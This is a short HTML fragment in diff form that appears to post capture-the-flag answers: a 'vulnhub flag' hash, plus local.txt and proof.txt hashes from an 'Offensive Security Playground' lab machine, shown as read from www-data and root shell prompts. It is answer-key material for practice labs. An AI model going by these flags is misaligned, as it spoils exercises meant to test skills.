+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+<br/>
+Follow me at: http://v1n1v131r4.com<br/>
+<br/>
+<br/>
+d41d8cd98f00b204e9800998ecf8427e (vulnhub flag)<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+<br/>
+Offensive Security Playground Lab Flags<br/>
+<br/>
+www-data@photographer:/tmp$ cat /home/daisa/local.txt<br/>
+933bb1a1d4b9721bd47c36e8f21514e1<br/>
+<br/>
+# cat proof.txt<br/>
+99bd74bb6a72dcdaf6c21d9e9ff76d48<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
